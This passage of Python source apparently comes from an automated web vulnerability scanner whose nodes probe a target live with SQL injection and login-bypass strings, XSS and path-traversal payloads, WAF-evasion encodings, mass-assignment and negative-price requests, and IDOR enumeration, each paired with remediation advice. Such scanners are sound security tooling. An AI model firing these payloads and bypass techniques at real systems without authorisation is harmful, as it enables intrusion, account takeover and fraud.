                    }, scan_id)

                self.emitter.add_graph_node({
                    "id":     ep_id,
                    "label":  path,
                    "type":   "service",
                    "risk":   risk,
                    "status": "active",
                })
                self.emitter.add_graph_edge({
                    "source": "target-root",
                    "target": ep_id,
                    "type":   "recon",
                    "active": True,
                })

                await self.emitter.emit(NodeEvent.ENDPOINT_DISCOVERED, {
                    "node":        self.name,
                    "endpoint":    url,
                    "status_code": result.status_code,
                    "message":     f"[{result.status_code}] Endpoint accessible: {path}",
                }, scan_id)

                # Finding: sensitive path exposed and accessible
                if result.status_code == 200 and any(k in path for k in
                        [".env", ".git", "phpinfo", "actuator/env",
                         "server-status", "debug"]):
                    sev = "critical" if ".env" in path or "actuator/env" in path else "high"
                    f = await self._make_finding(scan_id=scan_id,
                        title=f"Sensitive File Accessible: {path}",
                        description=(
                            f"The path {url} returned HTTP {result.status_code}. "
                            f"This may expose configuration secrets, credentials, or "
                            f"internal system information to unauthenticated users."
                        ),
                        severity=sev,
                        endpoint=url,
                        confidence=0.95,
                        cwe="CWE-200",
                        owasp="A05:2021 - Security Misconfiguration",
                        category="Information Disclosure",
                        matched_content=result.body[:300] if result.body else "",
                        remediation=(
                            "Block public access to sensitive configuration files "
                            "via web server rules. Ensure .env, .git, and debug "
                            "endpoints are never accessible in production."
                        ),
                    )
                    findings.append(f)
                    self._add_vuln_graph_node(
                        f"vuln-disclosure-{path.replace('/', '-').strip('-')}",
                        f"Info Disclosure @ {path}", sev, url
                    )
                elif result.status_code == 200 and any(k in path for k in ["admin", "graphiql", "swagger", "api-docs"]):
                    f = await self._make_finding(scan_id=scan_id,
                        title=f"Administrative Interface Exposed: {path}",
                        description=(
                            f"Administrative or documentation endpoint {url} is "
                            f"publicly accessible (HTTP {result.status_code}). "
                            f"This may allow unauthorized access to admin functions or API schema."
                        ),
                        severity="medium",
                        endpoint=url,
                        confidence=0.88,
                        cwe="CWE-284",
                        owasp="A01:2021 - Broken Access Control",
                        category="Access Control",
                        remediation="Require authentication for all administrative endpoints.",
                    )
                    findings.append(f)

            elif result.error:
                await self.emitter.emit(NodeEvent.ENDPOINT_DISCOVERED, {
                    "node":    self.name,
                    "endpoint": url,
                    "status":  "unreachable",
                    "message": f"Probe error on {path}: {result.error[:60]}",
                }, scan_id)

        # ── Security header analysis on root
        root_result = await self.probe.get(base + "/")
        if root_result.ok:
            missing_headers = ResponseAnalyzer.get_missing_security_headers(root_result.headers)
            if missing_headers:
                await self.emitter.emit(NodeEvent.SECURITY_HEADER, {
                    "node":    self.name,
                    "missing": missing_headers,
                    "message": f"Missing security headers: {', '.join(missing_headers)}",
                }, scan_id)
                f = await self._make_finding(scan_id=scan_id,
                    title="Missing HTTP Security Headers",
                    description=(
                        f"The target is missing {len(missing_headers)} critical security headers: "
                        f"{', '.join(missing_headers)}. These headers protect against clickjacking, "
                        f"MIME sniffing, and XSS attacks."
                    ),
                    severity="medium",
                    endpoint=base + "/",
                    confidence=0.99,
                    cwe="CWE-693",
                    owasp="A05:2021 - Security Misconfiguration",
                    category="Security Headers",
                    evidence={"missing_headers": missing_headers},
                    remediation=(
                        "Add the following headers in your web server / application: "
                        + "; ".join(missing_headers)
                    ),
                )
                findings.append(f)

            # CORS check
            cors_issue, cors_detail = ResponseAnalyzer.has_cors_issue(root_result.headers)
            if cors_issue:
                f = await self._make_finding(scan_id=scan_id,
                    title="CORS Misconfiguration Detected",
                    description=f"CORS policy is misconfigured: {cors_detail}. "
                                "This may allow cross-origin requests to access sensitive resources.",
                    severity="high",
                    endpoint=base + "/",
                    confidence=0.97,
                    cwe="CWE-942",
                    owasp="A05:2021 - Security Misconfiguration",
                    category="CORS",
                    matched_content=cors_detail,
                    remediation="Restrict Access-Control-Allow-Origin to trusted domains only.",
                )
                findings.append(f)

            # Tech disclosure finding
            if root_result.headers.get("X-Powered-By") or root_result.headers.get("Server"):
                server = root_result.headers.get("Server", "")
                powered = root_result.headers.get("X-Powered-By", "")
                if any(v for v in [server, powered]):
                    f = await self._make_finding(scan_id=scan_id,
                        title="Technology Stack Disclosed via HTTP Headers",
                        description=(
                            f"Server response reveals technology stack: "
                            f"Server={server!r}, X-Powered-By={powered!r}. "
                            f"This assists attackers in targeting known vulnerabilities."
                        ),
                        severity="low",
                        endpoint=base + "/",
                        confidence=0.99,
                        cwe="CWE-200",
                        owasp="A05:2021 - Security Misconfiguration",
                        category="Information Disclosure",
                        evidence={"Server": server, "X-Powered-By": powered},
                        remediation="Remove Server and X-Powered-By headers from HTTP responses.",
                    )
                    findings.append(f)

        context["discovered_endpoints"] = discovered_endpoints or [target]
        context["target_base"]          = base
        context["tech_disclosed"]       = tech_disclosed

        await self.emitter.emit(NodeEvent.SCAN_STAGE_COMPLETED, {
            "node":              self.name,
            "stage":             "reconnaissance",
            "endpoints_probed":  len(self.SENSITIVE_PATHS),
            "endpoints_active":  len(discovered_endpoints),
            "findings_count":    len(findings),
            "message":           (
                f"Recon-X completed: {len(discovered_endpoints)} active endpoints, "
                f"{len(findings)} findings"
            ),
        }, scan_id)

        return findings


# ══════════════════════════════════════════════════════════════════════════════
# 2. Payload-Gen — Vector Synthesis Engine
# ══════════════════════════════════════════════════════════════════════════════

class PayloadGenNode(IntelligenceNode):
    """Generate attack payload libraries from PayloadsAllTheThings."""

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("Payload-Gen", "Vector Synthesis Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        await PayloadLibrary.ensure_loaded()

        categories = {
            "SQL Injection":    PayloadLibrary.get_sqli(30),
            "XSS":              PayloadLibrary.get_xss(25),
            "Command Injection":PayloadLibrary.get_cmdi(20),
            "Directory Traversal": PayloadLibrary.get_traversal(15),
            "SSRF":             PayloadLibrary.ssrf_cloud[:10],
        }

        all_payloads: Dict[str, List[str]] = {}
        total = 0

        for vector_type, base_payloads in categories.items():
            mutated: List[str] = []
            for p in base_payloads:
                mutated.append(p)
                mutated.extend(PayloadLibrary.mutate(p))

            # Deduplicate
            mutated = list(dict.fromkeys(mutated))
            all_payloads[vector_type] = mutated
            total += len(mutated)

            await asyncio.sleep(0.04)
            await self.emitter.emit(NodeEvent.PAYLOAD_GENERATED, {
                "node":         self.name,
                "vector_type":  vector_type,
                "base_count":   len(base_payloads),
                "total_count":  len(mutated),
                "sample":       base_payloads[0] if base_payloads else "",
                "message":      (
                    f"Payload-Gen synthesized {len(mutated)} {vector_type} vectors "
                    f"({len(base_payloads)} base + {len(mutated) - len(base_payloads)} mutations)"
                ),
            }, scan_id)

        context["generated_payloads"] = all_payloads
        context["total_payloads"]     = total

        await self.emitter.emit(NodeEvent.SCAN_STAGE_COMPLETED, {
            "node":          self.name,
            "stage":         "payload_synthesis",
            "total_payloads": total,
            "vector_types":  list(categories.keys()),
            "message":       (
                f"Payload-Gen ready: {total} attack vectors across "
                f"{len(categories)} categories (PayloadsAllTheThings)"
            ),
        }, scan_id)

        return []  # No direct findings from payload generation


# ══════════════════════════════════════════════════════════════════════════════
# 3. Exploit-Core — Active Exploitation Engine
# ══════════════════════════════════════════════════════════════════════════════

class ExploitCoreNode(IntelligenceNode):
    """Execute vulnerability exploitation attempts with real HTTP probing."""

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("Exploit-Core", "Active Exploitation Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        findings: List[NodeFinding] = []
        endpoints = context.get("discovered_endpoints", [target])[:5]
        payloads  = context.get("generated_payloads", {})

        sqli_payloads = payloads.get("SQL Injection", PayloadLibrary.get_sqli(15))
        xss_payloads  = payloads.get("XSS", PayloadLibrary.get_xss(12))
        lfi_payloads  = payloads.get("Directory Traversal", PayloadLibrary.get_traversal(10))

        for ep in endpoints[:4]:
            # ── SQLi Detection ─────────────────────────────────────────────
            for payload in sqli_payloads[:8]:
                await asyncio.sleep(0.04)
                probe_url = ep + ("&" if "?" in ep else "?") + f"id={payload}&q={payload}"
                await self.emitter.emit(NodeEvent.ATTACK_ATTEMPTED, {
                    "node":     self.name,
                    "endpoint": ep,
                    "vector":   "SQLi",
                    "payload":  payload[:60],
                    "message":  f"SQLi probe on {ep.split('?')[0]} — payload: {payload[:40]}",
                }, scan_id)

                result = await self.probe.get(probe_url)
                if result.ok:
                    has_err, matched = ResponseAnalyzer.has_sql_error(result.body)
                    if has_err:
                        f = await self._make_finding(scan_id=scan_id,
                            title="SQL Injection — Error-Based Confirmed",
                            description=(
                                f"SQL error message detected in response to injected payload. "
                                f"Error signature: {matched[:100]}. "
                                f"The backend database is leaking error output, confirming "
                                f"the injection point is exploitable."
                            ),
                            severity="critical",
                            endpoint=ep,
                            confidence=0.97,
                            cwe="CWE-89",
                            owasp="A03:2021 - Injection",
                            category="SQL Injection",
                            exploit_payload=payload,
                            matched_content=matched,
                            evidence={"db_error": matched, "probe_url": probe_url},
                            remediation=(
                                "Use parameterized queries / prepared statements. "
                                "Never interpolate user input into SQL strings. "
                                "Suppress database error messages in production."
                            ),
                        )
                        findings.append(f)
                        self._add_vuln_graph_node(
                            f"vuln-sqli-{ep.split('/')[-1][:20]}",
                            f"SQLi @ {ep.split('/')[-1]}", "critical", ep
                        )
                        break  # one confirmed finding per endpoint is enough

            # ── XSS Reflection Detection ───────────────────────────────────
            for payload in xss_payloads[:6]:
                await asyncio.sleep(0.03)
                probe_url = ep + ("&" if "?" in ep else "?") + f"q={payload}&search={payload}"
                await self.emitter.emit(NodeEvent.ATTACK_ATTEMPTED, {
                    "node":     self.name,
                    "endpoint": ep,
                    "vector":   "XSS",
                    "payload":  payload[:60],
                    "message":  f"XSS reflection probe on {ep.split('?')[0]}",
                }, scan_id)

                result = await self.probe.get(probe_url)
                if result.ok and ResponseAnalyzer.has_reflection(result.body, payload):
                    f = await self._make_finding(scan_id=scan_id,
                        title="Reflected XSS — Payload Unencoded in Response",
                        description=(
                            f"XSS probe payload was reflected unencoded in the HTTP response. "
                            f"An attacker could craft a malicious link to execute JavaScript "
                            f"in the victim's browser, enabling session hijacking or phishing."
                        ),
                        severity="high",
                        endpoint=ep,
                        confidence=0.92,
                        cwe="CWE-79",
                        owasp="A03:2021 - Injection",
                        category="Cross-Site Scripting",
                        exploit_payload=payload,
                        matched_content=payload[:80],
                        remediation=(
                            "Encode all user-supplied output using context-aware encoding "
                            "(HTML entity encoding, JS escaping). Implement a strict CSP."
                        ),
                    )
                    findings.append(f)
                    self._add_vuln_graph_node(
                        f"vuln-xss-{ep.split('/')[-1][:20]}",
                        f"Reflected XSS @ {ep.split('/')[-1]}", "high", ep
                    )
                    break

            # ── LFI / Path Traversal Detection ─────────────────────────────
            for payload in lfi_payloads[:5]:
                await asyncio.sleep(0.03)
                probe_url = ep + ("&" if "?" in ep else "?") + f"file={payload}&path={payload}"
                result = await self.probe.get(probe_url)
                if result.ok:
                    has_lfi, matched = ResponseAnalyzer.has_lfi_content(result.body)
                    if has_lfi:
                        await self.emitter.emit(NodeEvent.ATTACK_ATTEMPTED, {
                            "node":    self.name,
                            "vector":  "LFI",
                            "message": f"LFI confirmed on {ep.split('?')[0]}",
                        }, scan_id)
                        f = await self._make_finding(scan_id=scan_id,
                            title="Local File Inclusion (LFI) — System File Read Confirmed",
                            description=(
                                f"Path traversal payload caused the server to include/read a "
                                f"local system file. Matched content: {matched[:100]}. "
                                f"This may allow an attacker to read /etc/passwd, config files, "
                                f"or application source code."
                            ),
                            severity="critical",
                            endpoint=ep,
                            confidence=0.95,
                            cwe="CWE-22",
                            owasp="A01:2021 - Broken Access Control",
                            category="Path Traversal / LFI",
                            exploit_payload=payload,
                            matched_content=matched,
                            remediation=(
                                "Validate and canonicalize file paths before use. "
                                "Use a whitelist of allowed file names. "
                                "Avoid passing user input directly to filesystem functions."
                            ),
                        )
                        findings.append(f)
                        break

        await self.emitter.emit(NodeEvent.SCAN_STAGE_COMPLETED, {
            "node":           self.name,
            "stage":          "exploitation",
            "findings_count": len(findings),
            "endpoints_tested": len(endpoints[:4]),
            "message":        (
                f"Exploit-Core completed: {len(findings)} confirmed vulnerabilities "
                f"across {len(endpoints[:4])} endpoints"
            ),
        }, scan_id)

        return findings


# ══════════════════════════════════════════════════════════════════════════════
# 4. Auth-Breach — Credential Bypass Engine
# ══════════════════════════════════════════════════════════════════════════════

class AuthBreachNode(IntelligenceNode):
    """Detect authentication vulnerabilities via real HTTP analysis."""

    AUTH_ENDPOINTS = [
        "/api/v1/auth/login", "/api/auth/login", "/api/login",
        "/auth/login", "/login", "/api/v1/token", "/api/token",
        "/oauth/token", "/auth/token",
    ]

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("Auth-Breach", "Credential Bypass Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        findings: List[NodeFinding] = []
        base = context.get("target_base", target)

        # ── Probe auth endpoints
        for path in self.AUTH_ENDPOINTS:
            url = urljoin(base + "/", path.lstrip("/"))
            await asyncio.sleep(0.04)
            await self.emitter.emit(NodeEvent.AUTH_TEST_EXECUTED, {
                "node":    self.name,
                "test":    "endpoint_probe",
                "message": f"Probing auth endpoint: {path}",
            }, scan_id)

            # GET request to discover auth endpoint
            result = await self.probe.get(url)
            if not result.ok or result.status_code == 0:
                continue

            if result.status_code in (200, 401, 403, 405):
                # ── Check for JWT in response (possible auth bypass indicator)
                sens = ResponseAnalyzer.find_sensitive_data(result.body)
                if "JWT Token" in sens:
                    await self.emitter.emit(NodeEvent.AUTH_TEST_EXECUTED, {
                        "node":    self.name,
                        "test":    "jwt_exposure",
                        "message": f"JWT token found in unauthenticated response at {path}",
                    }, scan_id)
                    f = await self._make_finding(scan_id=scan_id,
                        title="JWT Token Exposed in Unauthenticated Response",
                        description=(
                            f"A JWT token was found in the HTTP response body at {url} "
                            f"without prior authentication. This may indicate improperly "
                            f"protected token issuance or debug endpoint exposure."
                        ),
                        severity="high",
                        endpoint=url,
                        confidence=0.93,
                        cwe="CWE-522",
                        owasp="A07:2021 - Identification and Authentication Failures",
                        category="Authentication",
                        matched_content=sens["JWT Token"],
                        remediation=(
                            "Ensure JWT tokens are only issued after successful "
                            "credential verification. Restrict debug/test endpoints in production."
                        ),
                    )
                    findings.append(f)

                # ── Check cookie security flags
                set_cookie = result.headers.get("Set-Cookie", "")
                if set_cookie and result.status_code == 200:
                    issues = []
                    if "httponly" not in set_cookie.lower():
                        issues.append("Missing HttpOnly flag")
                    if "secure" not in set_cookie.lower():
                        issues.append("Missing Secure flag")
                    if "samesite" not in set_cookie.lower():
                        issues.append("Missing SameSite attribute")

                    if issues:
                        f = await self._make_finding(scan_id=scan_id,
                            title="Insecure Session Cookie Configuration",
                            description=(
                                f"Session cookie at {url} is missing security attributes: "
                                f"{', '.join(issues)}. This exposes session tokens to "
                                f"XSS-based hijacking and CSRF attacks."
                            ),
                            severity="high",
                            endpoint=url,
                            confidence=0.97,
                            cwe="CWE-614",
                            owasp="A07:2021 - Identification and Authentication Failures",
                            category="Session Management",
                            evidence={"issues": issues, "set_cookie": set_cookie[:200]},
                            remediation=(
                                "Set HttpOnly, Secure, and SameSite=Strict on all session cookies."
                            ),
                        )
                        findings.append(f)

                # ── SQL injection in auth (bypass attempt)
                sqli_result_a = await self.probe.post(url, json_data={
                    "username": "admin'--", "password": "anything"
                })
                sqli_result_b = await self.probe.post(url, json_data={
                    "username": "' OR '1'='1'--", "password": "pass"
                })

                await self.emitter.emit(NodeEvent.AUTH_TEST_EXECUTED, {
                    "node":    self.name,
                    "test":    "sqli_auth_bypass",
                    "message": f"Testing SQL injection auth bypass at {path}",
                }, scan_id)

                for r in [sqli_result_a, sqli_result_b]:
                    if r.ok:
                        has_err, matched = ResponseAnalyzer.has_sql_error(r.body)
                        if has_err:
                            f = await self._make_finding(scan_id=scan_id,
                                title="SQL Injection in Authentication Endpoint",
                                description=(
                                    f"SQL injection payload in login credentials triggered "
                                    f"a database error at {url}: {matched[:100]}. "
                                    f"This may allow authentication bypass and full account takeover."
                                ),
                                severity="critical",
                                endpoint=url,
                                confidence=0.96,
                                cwe="CWE-89",
                                owasp="A03:2021 - Injection",
                                category="Authentication Bypass",
                                exploit_payload="' OR '1'='1'--",
                                matched_content=matched,
                                remediation=(
                                    "Use parameterized queries for all credential lookups. "
                                    "Never construct SQL with string concatenation of user input."
                                ),
                            )
                            findings.append(f)
                            break

                # ── Rate limiting check (rapid requests)
                t0 = time.monotonic()
                rapid_results = await asyncio.gather(*[
                    self.probe.post(url, json_data={"username": f"test{i}", "password": "wrong"})
                    for i in range(5)
                ], return_exceptions=True)
                elapsed = time.monotonic() - t0

                no_rate_limit = all(
                    isinstance(r, ProbeResult) and r.status_code not in (429, 423)
                    for r in rapid_results if isinstance(r, ProbeResult) and r.ok
                )

                await self.emitter.emit(NodeEvent.AUTH_TEST_EXECUTED, {
                    "node":    self.name,
                    "test":    "rate_limiting",
                    "message": f"Rate limit test: 5 rapid requests in {elapsed:.2f}s to {path}",
                }, scan_id)

                if no_rate_limit and any(
                    isinstance(r, ProbeResult) and r.ok for r in rapid_results
                ):
                    f = await self._make_finding(scan_id=scan_id,
                        title="Missing Rate Limiting on Authentication Endpoint",
                        description=(
                            f"5 rapid login requests to {url} were all accepted without "
                            f"triggering a 429 Too Many Requests response. "
                            f"This allows unlimited credential stuffing and brute-force attacks."
                        ),
                        severity="high",
                        endpoint=url,
                        confidence=0.88,
                        cwe="CWE-307",
                        owasp="A07:2021 - Identification and Authentication Failures",
                        category="Brute Force Protection",
                        evidence={"requests_sent": 5, "time_elapsed": round(elapsed, 2)},
                        remediation=(
                            "Implement rate limiting (e.g., 5 attempts/minute per IP/account). "
                            "Add account lockout after N failed attempts. "
                            "Use CAPTCHA for repeated failures."
                        ),
                    )
                    findings.append(f)
                    break  # one endpoint is enough for rate limit finding

        return findings


# ══════════════════════════════════════════════════════════════════════════════
# 5. WAF-Evasion — Traffic Obfuscation Engine
# ══════════════════════════════════════════════════════════════════════════════

class WAFEvasionNode(IntelligenceNode):
    """Test WAF bypass techniques and detect WAF presence."""

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("WAF-Evasion", "Traffic Obfuscation Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        findings: List[NodeFinding] = []
        base = context.get("target_base", target)
        test_url = base + "/"

        # ── Detect WAF presence
        result_baseline = await self.probe.get(test_url)
        detected_waf: Optional[str] = None
        if result_baseline.ok:
            detected_waf = ResponseAnalyzer.detect_waf(
                result_baseline.headers, result_baseline.body
            )
            if detected_waf:
                await self.emitter.emit(NodeEvent.WAF_BYPASS_ATTEMPTED, {
                    "node":    self.name,
                    "waf":     detected_waf,
                    "message": f"WAF detected: {detected_waf} — beginning bypass analysis",
                }, scan_id)

        evasion_techniques = [
            {
                "name":    "Unicode Normalization",
                "payload": "\u003cscript\u003ealert(1)\u003c/script\u003e",
                "desc":    "Unicode escape sequences bypass keyword-based WAF signature matching.",
            },
            {
                "name":    "HTTP Parameter Pollution",
                "payload": "id=1&id=2' OR '1'='1",
                "desc":    "Duplicate parameters confuse WAF parsers that only inspect the first value.",
            },
            {
                "name":    "Case Randomization",
                "payload": "sElEcT * FrOm UsErS wHeRe Id=1--",
                "desc":    "Mixed-case SQL keywords bypass case-sensitive WAF signature matching.",
            },
            {
                "name":    "Comment-Based Obfuscation",
                "payload": "1'/**/OR/**/'1'='1'--",
                "desc":    "Inline SQL comments inserted between keywords bypass lexical analysis.",
            },
            {
                "name":    "Double URL Encoding",
                "payload": "%253cscript%253ealert(1)%253c%252fscript%253e",
                "desc":    "Double URL encoding bypasses WAFs that only decode once.",
            },
            {
                "name":    "Null Byte Injection",
                "payload": "' OR 1=1%00--",
                "desc":    "Null byte causes some WAFs to stop parsing the string prematurely.",
            },
        ]

        for technique in evasion_techniques:
            await asyncio.sleep(0.04)
            probe_url = (test_url + "?" + technique["payload"].replace(" ", "+")
                         if "?" not in test_url else test_url + "&" + technique["payload"])

            result = await self.probe.get(probe_url)

            await self.emitter.emit(NodeEvent.WAF_BYPASS_ATTEMPTED, {
                "node":      self.name,
                "technique": technique["name"],
                "payload":   technique["payload"][:60],
                "message":   f"WAF evasion test: {technique['name']} → HTTP {result.status_code if result.ok else 'ERR'}",
            }, scan_id)

            # If WAF is present and the evasion payload got through (no 403/406/429)
            if detected_waf and result.ok and result.status_code not in (403, 406, 429, 0):
                f = await self._make_finding(scan_id=scan_id,
                    title=f"WAF Bypass Successful: {technique['name']}",
                    description=(
                        f"{detected_waf} WAF was bypassed using {technique['name']} technique. "
                        f"{technique['desc']} "
                        f"The malicious payload reached the application layer (HTTP {result.status_code})."
                    ),
                    severity="high",
                    endpoint=test_url,
                    confidence=0.82,
                    cwe="CWE-693",
                    owasp="A05:2021 - Security Misconfiguration",
                    category="WAF Bypass",
                    exploit_payload=technique["payload"],
                    remediation=(
                        "Update WAF rule sets to cover encoding/obfuscation variants. "
                        "Implement application-layer input validation as a secondary defense. "
                        "Use behavioral analysis WAF rules, not just signature matching."
                    ),
                )
                findings.append(f)
            elif not detected_waf and result.ok and result.status_code == 200:
                # No WAF found — potential unprotected injection point
                pass

        # Finding: no WAF detected
        if not detected_waf and result_baseline.ok:
            f = await self._make_finding(scan_id=scan_id,
                title="No Web Application Firewall (WAF) Detected",
                description=(
                    "No WAF signatures were detected in HTTP responses. "
                    "The application appears to have no perimeter defense layer against "
                    "injection attacks, XSS, and other web-based attacks."
                ),
                severity="medium",
                endpoint=test_url,
                confidence=0.75,
                cwe="CWE-693",
                owasp="A05:2021 - Security Misconfiguration",
                category="Defense in Depth",
                remediation=(
                    "Deploy a Web Application Firewall (e.g., AWS WAF, Cloudflare, ModSecurity) "
                    "as an additional defense layer. Configure rules for OWASP Top 10 attacks."
                ),
            )
            findings.append(f)

        return findings


# ══════════════════════════════════════════════════════════════════════════════
# 6. Logic-Probe — Business Logic Analysis Engine
# ══════════════════════════════════════════════════════════════════════════════

class LogicProbeNode(IntelligenceNode):
    """Detect flaws in application business logic."""

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("Logic-Probe", "Business Logic Analysis Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        findings: List[NodeFinding] = []
        base = context.get("target_base", target)

        logic_tests = [
            {
                "name": "Mass Assignment / Parameter Pollution",
                "paths": ["/api/v1/users/profile", "/api/user/update", "/profile"],
                "payload": {"role": "admin", "is_admin": True, "subscription": "enterprise"},
                "cwe": "CWE-915", "sev": "high",
                "desc": "Mass assignment vulnerability: sending extra parameters (role, is_admin) in a user update request may result in privilege escalation if the application does not use a strict field whitelist.",
                "remediation": "Use DTOs or explicit field whitelisting. Never bind entire request body to model objects.",
            },
            {
                "name": "Negative Price / Quantity Manipulation",
                "paths": ["/api/cart", "/api/v1/checkout", "/cart/update"],
                "payload": {"quantity": -1, "price": -99.99, "amount": -100},
                "cwe": "CWE-840", "sev": "critical",
                "desc": "Negative numeric values accepted in purchase/cart flow, potentially allowing price manipulation (negative charges, credit accumulation).",
                "remediation": "Validate all numeric fields server-side: enforce minimum values > 0 for prices/quantities.",
            },
            {
                "name": "Workflow Step Bypass",
                "paths": ["/api/v1/checkout/confirm", "/api/payment/complete", "/api/v1/order/finalize"],
                "payload": {"skip_verification": True, "step": "complete"},
                "cwe": "CWE-841", "sev": "high",
                "desc": "Direct access to checkout/payment completion endpoint without completing prior verification steps — potential workflow bypass.",
                "remediation": "Enforce server-side state machine validation. Never trust client-controlled workflow state.",
            },
        ]

        for test in logic_tests:
            await asyncio.sleep(0.05)
            found_one = False
            for path in test["paths"]:
                if found_one:
                    break
                url = urljoin(base + "/", path.lstrip("/"))
                await self.emitter.emit(NodeEvent.LOGIC_ANALYSIS_EVENT, {
                    "node":    self.name,
                    "test":    test["name"],
                    "message": f"Logic probe: {test['name']} at {path}",
                }, scan_id)

                # Test with normal request first
                base_result = await self.probe.get(url)
                if not base_result.ok:
                    continue

                # Test with manipulated payload
                probe_result = await self.probe.post(url, json_data=test["payload"])

                # Detection heuristic: endpoint accepts request with suspicious params
                if probe_result.ok and probe_result.status_code in (200, 201, 202):
                    # Check if response indicates success/acceptance
                    body_lower = probe_result.body_lower
                    accept_indicators = ["success", "accepted", "updated", "created",
                                         "ok", "true", "cart", "order", "payment"]
                    if any(ind in body_lower for ind in accept_indicators):
                        f = await self._make_finding(scan_id=scan_id,
                            title=f"Business Logic Flaw: {test['name']}",
                            description=test["desc"],
                            severity=test["sev"],
                            endpoint=url,
                            confidence=0.78,
                            cwe=test["cwe"],
                            owasp="A04:2021 - Insecure Design",
                            category="Business Logic",
                            exploit_payload=json.dumps(test["payload"]),
                            evidence={
                                "status_code": probe_result.status_code,
                                "response_snippet": probe_result.body[:200],
                            },
                            remediation=test["remediation"],
                        )
                        findings.append(f)
                        found_one = True

        return findings


# ══════════════════════════════════════════════════════════════════════════════
# 7. API-Guardian — Endpoint Analysis Engine
# ══════════════════════════════════════════════════════════════════════════════

class APIGuardianNode(IntelligenceNode):
    """Analyze API endpoints for BOLA, mass assignment, and schema exposure."""

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("API-Guardian", "Endpoint Analysis Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        findings: List[NodeFinding] = []
        base = context.get("target_base", target)

        api_paths_to_test = [
            "/api/v1/users/1", "/api/v1/users/2", "/api/v1/users/100",
            "/api/users/1", "/api/users/2",
            "/api/v1/accounts/1", "/api/v1/orders/1",
            "/api/v1/admin/users", "/api/v1/admin/config",
        ]

        doc_paths = [
            "/swagger.json", "/openapi.json", "/api-docs",
            "/swagger-ui", "/swagger-ui.html", "/api/swagger",
            "/v1/docs", "/docs/api",
        ]

        # ── BOLA / IDOR probing
        idor_results: Dict[str, int] = {}
        for path in api_paths_to_test[:6]:
            await asyncio.sleep(0.04)
            url = urljoin(base + "/", path.lstrip("/"))
            result = await self.probe.get(url)

            await self.emitter.emit(NodeEvent.ENDPOINT_DISCOVERED, {
                "node":    self.name,
                "path":    path,
                "status":  result.status_code if result.ok else "ERR",
                "message": f"API probe: [{result.status_code if result.ok else 'ERR'}] {path}",
            }, scan_id)

            if result.ok:
                idor_results[path] = result.status_code
                if result.status_code == 200 and "users" in path:
                    # Check if user data is returned without auth
                    body_lower = result.body_lower
                    data_indicators = ["email", "username", "user_id", "password", "role", "token"]
                    exposed_fields = [f for f in data_indicators if f in body_lower]
                    if exposed_fields:
                        f = await self._make_finding(scan_id=scan_id,
                            title="BOLA / IDOR — User Data Accessible Without Authorization",
                            description=(
                                f"Endpoint {url} returned user data (fields: {', '.join(exposed_fields[:5])}) "
                                f"via sequential ID enumeration without authentication. "
                                f"An attacker can enumerate all user accounts by incrementing the ID."
                            ),
                            severity="critical",
                            endpoint=url,
                            confidence=0.89,
                            cwe="CWE-639",
                            owasp="A01:2021 - Broken Access Control",
                            category="Broken Object Level Authorization",
                            evidence={"exposed_fields": exposed_fields, "path": path},
                            remediation=(
                                "Verify object ownership on every request. "
                                "Use non-sequential UUIDs instead of integer IDs. "
                                "Require authentication for all user data endpoints."
                            ),
                        )
                        findings.append(f)
                        self._add_vuln_graph_node(
                            "vuln-idor-users", "IDOR / BOLA @ /api/users", "critical", url
                        )
                        break

        # ── API Documentation Exposure
        for path in doc_paths:
            await asyncio.sleep(0.03)
            url = urljoin(base + "/", path.lstrip("/"))
            result = await self.probe.get(url)
            if result.ok and result.status_code == 200:
                content_type = result.headers.get("Content-Type", "").lower()
                if "json" in content_type or "html" in content_type or "swagger" in result.body_lower:
                    f = await self._make_finding(scan_id=scan_id,
                        title=f"API Documentation Exposed: {path}",
                        description=(
                            f"API documentation endpoint {url} is publicly accessible. "
                            f"This reveals all API endpoints, parameters, authentication schemes, "
                            f"and data models to potential attackers."
                        ),
                        severity="medium",
                        endpoint=url,
                        confidence=0.95,
                        cwe="CWE-200",
                        owasp="A05:2021 - Security Misconfiguration",
                        category="API Security",
                        remediation=(
                            "Restrict API documentation to authenticated/authorized users only. "
                            "Disable Swagger/OpenAPI UI in production environments."
                        ),
                    )
                    findings.append(f)
                    break

        # ── GraphQL Introspection Check
        graphql_url = urljoin(base + "/", "graphql")
        gql_result = await self.probe.post(
            graphql_url,
            json_data={"query": "{__schema{queryType{name}}}"}
        )
        if gql_result.ok and gql_result.status_code == 200 and "__schema" in gql_result.body:
            await self.emitter.emit(NodeEvent.ENDPOINT_DISCOVERED, {
                "node":    self.name,
                "message": "GraphQL introspection enabled — schema fully readable",
            }, scan_id)
            f = await self._make_finding(scan_id=scan_id,
                title="GraphQL Introspection Enabled in Production",
                description=(
                    "GraphQL introspection is enabled, allowing any client to query the full "
                    "schema, all types, fields, mutations, and queries. This exposes the "
                    "complete application data model to attackers."
                ),
                severity="medium",
                endpoint=graphql_url,
                confidence=0.98,
                cwe="CWE-200",
                owasp="A05:2021 - Security Misconfiguration",
                category="GraphQL Security",
                matched_content=gql_result.body[:200],
                remediation=(
                    "Disable GraphQL introspection in production environments. "
                    "Use field-level permissions and query depth/complexity limits."
                ),
            )
            findings.append(f)

        return findings


# ══════════════════════════════════════════════════════════════════════════════
# 8. Cloud-Siphon — Infrastructure Mapping Engine
# ══════════════════════════════════════════════════════════════════════════════

class CloudSiphonNode(IntelligenceNode):
    """Analyze cloud infrastructure exposure via SSRF probing and header analysis."""

    def __init__(self, emitter: SwarmTelemetryEmitter):
        super().__init__("Cloud-Siphon", "Infrastructure Mapping Engine", emitter)

    async def _run(self, target: str, scan_id: str, context: Dict) -> List[NodeFinding]:
        findings: List[NodeFinding] = []
        base = context.get("target_base", target)

        # ── Cloud service fingerprinting from existing probes
